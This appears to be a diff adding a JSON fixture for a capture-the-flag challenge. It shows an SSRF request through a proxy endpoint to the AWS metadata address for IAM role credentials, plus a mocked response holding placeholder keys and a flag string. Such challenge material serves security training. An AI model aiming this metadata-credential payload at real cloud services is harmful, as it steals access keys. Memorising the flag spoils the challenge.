@@ -1,0 +1,11 @@
+﻿{
+  "service": "AWS EC2 Ephemeral Node",
+  "endpoint": "/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ArenaWorkerRole",
+  "ssrf_response": {
+    "Code": "Success",
+    "Type": "AWS-HMAC",
+    "AccessKeyId": "ASIAQEXAMPLEKEYS",
+    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+    "Token": "logicCTF{ssrf_cl0ud_m3t4d4t4_cr3ds_pwn}"
+  }
+}
